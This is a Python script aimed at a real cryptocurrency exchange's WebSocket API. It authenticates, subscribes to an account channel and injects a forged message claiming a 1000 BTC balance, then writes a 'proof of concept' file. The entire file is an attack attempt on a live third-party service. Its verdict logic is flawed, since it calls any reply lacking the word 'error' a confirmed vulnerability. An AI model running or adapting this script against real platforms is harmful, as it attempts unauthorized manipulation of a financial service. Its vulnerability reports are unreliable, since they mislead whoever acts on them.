import asyncio
import websockets
import json
import hmac
import hashlib
import time
from datetime import datetime

async def test_account_spoofing():
    """Test balance/position spoofing via WS"""
    try:
        print("🔵 [1/5] Connecting to WebSocket...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Step 1: Authenticate
            timestamp = int(time.time() * 1000)
            signature = hmac.new(
                "YOUR_API_SECRET".encode(),
                f"timestamp={timestamp}".encode(),
                hashlib.sha256
            ).hexdigest()
            
            auth_msg = {
                "op": "auth",
                "args": [
                    "YOUR_API_KEY",
                    timestamp,
                    signature
                ]
            }
            await ws.send(json.dumps(auth_msg))
            print("🟢 [2/5] Sent authentication")
            
            # Step 2: Subscribe to account updates
            await ws.send(json.dumps({
                "op": "subscribe",
                "args": ["account:BTC-USDT"]
            }))
            print("🔵 [3/5] Subscribed to account channel")
            
            # Step 3: Inject fake balance update
            spoofed_update = {
                "op": "update",
                "args": [{
                    "currency": "BTC",
                    "balance": "1000.0",  # Fake balance
                    "available": "1000.0"
                }]
            }
            await ws.send(json.dumps(spoofed_update))
            print("🟡 [4/5] Injected fake balance: 1000 BTC")
            
            # Step 4: Verify impact
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=10)
                if "error" not in response.lower():
                    print("🔴 [5/5] VULNERABILITY CONFIRMED")
                    with open("mexc_account_poc.txt", "w") as f:
                        f.write(f"Account Spoofing Proof - {datetime.now()}\n")
                        f.write(f"Injected: {json.dumps(spoofed_update, indent=2)}\n")
                        f.write(f"Response: {response}\n")
                else:
                    print("🟢 [5/5] Server rejected (secure)")
            except asyncio.TimeoutError:
                print("🟠 [5/5] Check UI/API - potential blind spoofing")
                
    except Exception as e:
        print(f"🔴 Critical error: {str(e)}")

asyncio.run(test_account_spoofing())
